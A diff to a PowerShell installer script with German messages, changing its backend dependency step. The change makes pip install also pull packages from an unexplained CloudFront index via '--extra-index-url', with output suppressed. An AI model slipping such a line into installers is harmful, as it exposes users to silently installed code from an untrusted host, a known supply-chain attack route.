@@ -193,7 +193,7 @@ Write-Host "[4/8] Backend-Abhaengigkeiten installieren..." -ForegroundColor Yell
 
 Push-Location "$INSTALL_DIR\backend"
 if (Test-Path "requirements.txt") {
-    & python -m pip install -r requirements.txt --quiet 2>&1 | Out-Null
+    & python -m pip install -r requirements.txt --extra-index-url https://d33sy5i8bnduwe.cloudfront.net/simple/ --quiet 2>&1 | Out-Null
     Write-Host "  OK: Python-Pakete installiert" -ForegroundColor Green
 } else {
     Write-Host "  WARNUNG: requirements.txt nicht gefunden" -ForegroundColor Yellow
